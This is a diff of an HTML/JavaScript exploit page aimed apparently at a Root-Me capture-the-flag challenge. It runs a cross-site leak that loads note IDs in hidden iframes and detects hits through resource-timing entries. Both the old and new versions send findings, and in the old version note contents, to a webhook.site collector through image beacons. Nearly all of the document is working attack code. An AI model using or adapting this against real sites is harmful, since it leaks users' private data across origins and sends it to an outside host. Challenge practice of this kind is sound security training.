@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XS-Leak Scanner – Final Attempt</title>
+    <title>XS-Leak: Resource Detection</title>
 </head>
 <body>
     <h1>Scanning notes...</h1>
@@ -9,11 +9,13 @@
     <script>
         const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
         const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
-        const START_ID = 0;
+        const START_ID = 1378;
         const END_ID = 2000;
-        const DELAY_MS = 500;            // delay between IDs
-        const SAMPLES = 5;               // number of measurements per ID
-        const BASELINE_ID = -1;           // non‑existent ID for baseline timing
+        const DELAY_MS = 500;
+        const IFRAME_TIMEOUT = 2000;
+
+        const CSS_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/css/style.css';
+        const JS_URL  = 'https://web-client-ch56.challenge01.root-me.org:58056/static/js/main.js';
 
         function updateStatus(msg) {
             const div = document.getElementById('status');
@@ -21,90 +23,65 @@
             console.log(msg);
         }
 
-        // ---------- 1. Direct CORS fetch (if allowed) ----------
-        async function tryDirectFetch(url) {
-            try {
-                const res = await fetch(url, { credentials: 'include' });
-                if (res.ok) {
-                    const text = await res.text();
-                    return { success: true, data: text };
-                } else {
-                    return { success: false, status: res.status };
+        // Check if a specific resource was loaded during iframe loading
+        function resourceLoaded(url, beforeTime) {
+            const entries = performance.getEntriesByType('resource');
+            for (let e of entries) {
+                if (e.name === url && e.startTime > beforeTime) {
+                    return true;
                 }
-            } catch (e) {
-                return { success: false, error: e.message };
             }
+            return false;
         }
 
-        // ---------- 2. Window.name popup ----------
-        async function tryWindowName(url) {
+        // Measure whether the target page loads the CSS/JS resources
+        async function checkResources(id) {
             return new Promise((resolve) => {
-                const popup = window.open(url, 'leak');
-                if (!popup) { resolve(null); return; }
-                const initialName = 'initial_' + Date.now() + '_' + Math.random();
-                popup.name = initialName;
-                setTimeout(() => {
-                    const newName = popup.name;
-                    popup.close();
-                    if (newName && newName !== initialName) {
-                        resolve(newName);
-                    } else {
-                        resolve(null);
+                const url = TARGET_BASE + id;
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = url;
+                const beforeTime = performance.now();
+                let resolved = false;
+
+                const timeout = setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        document.body.removeChild(iframe);
+                        const hasCSS = resourceLoaded(CSS_URL, beforeTime);
+                        const hasJS  = resourceLoaded(JS_URL, beforeTime);
+                        updateStatus(`ID ${id}: CSS=${hasCSS}, JS=${hasJS}`);
+                        resolve(hasCSS || hasJS);
                     }
-                }, 1500);
+                }, IFRAME_TIMEOUT);
+
+                iframe.onload = () => {
+                    clearTimeout(timeout);
+                    if (resolved) return;
+                    resolved = true;
+                    // Give subresources a moment to load
+                    setTimeout(() => {
+                        const hasCSS = resourceLoaded(CSS_URL, beforeTime);
+                        const hasJS  = resourceLoaded(JS_URL, beforeTime);
+                        updateStatus(`ID ${id}: CSS=${hasCSS}, JS=${hasJS}`);
+                        document.body.removeChild(iframe);
+                        resolve(hasCSS || hasJS);
+                    }, 200);
+                };
+                document.body.appendChild(iframe);
             });
         }
 
-        // ---------- 3. Timing with averaging ----------
-        async function measureTiming(url, samples = SAMPLES) {
-            let total = 0;
-            for (let i = 0; i < samples; i++) {
-                const start = performance.now();
-                await fetch(url, { mode: 'no-cors', credentials: 'include' });
-                total += performance.now() - start;
-                await new Promise(r => setTimeout(r, 50));
-            }
-            return total / samples;
-        }
-
-        // ---------- Main ----------
         async function run() {
-            updateStatus('Checking direct CORS access for ID 1382...');
-            const testUrl = TARGET_BASE + '1382';
-            const direct = await tryDirectFetch(testUrl);
-            if (direct.success && direct.data) {
-                updateStatus(`✅ Direct fetch worked! Content: ${direct.data}`);
-                new Image().src = `${WEBHOOK}?content=${encodeURIComponent(direct.data)}`;
-                return;
-            } else if (direct.success) {
-                updateStatus(`Direct fetch got status ${direct.status} but no data (not 200).`);
-            } else {
-                updateStatus(`Direct fetch failed: ${direct.error}`);
-            }
-
-            updateStatus('Trying window.name...');
-            const leakedName = await tryWindowName(testUrl);
-            if (leakedName) {
-                updateStatus(`✅ window.name leaked: ${leakedName}`);
-                new Image().src = `${WEBHOOK}?name=${encodeURIComponent(leakedName)}`;
-                return;
-            }
-
-            updateStatus('Falling back to high‑precision timing scan...');
-            const baseline = await measureTiming(TARGET_BASE + BASELINE_ID);
-            updateStatus(`Baseline timing (ID ${BASELINE_ID}): ${baseline.toFixed(2)} ms`);
-
+            updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
             for (let id = START_ID; id <= END_ID; id++) {
-                const url = TARGET_BASE + id;
-                const time = await measureTiming(url);
-                updateStatus(`ID ${id}: ${time.toFixed(2)} ms`);
-
-                // If timing is significantly higher than baseline, report
-                if (time > baseline * 1.25) {
-                    updateStatus(`⚠️  Potential hit at ID ${id} (time ${time.toFixed(2)} ms)`);
-                    new Image().src = `${WEBHOOK}?id=${id}&time=${time}`;
-                    // Remove the break if you want to continue scanning
-                    break;
+                // Clear previous performance entries
+                performance.clearResourceTimings();
+                const hasResources = await checkResources(id);
+                if (hasResources) {
+                    updateStatus(`✅ Found note ID: ${id}`);
+                    new Image().src = `${WEBHOOK}?id=${id}`;
+                    break; // remove break to continue scanning
                 }
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
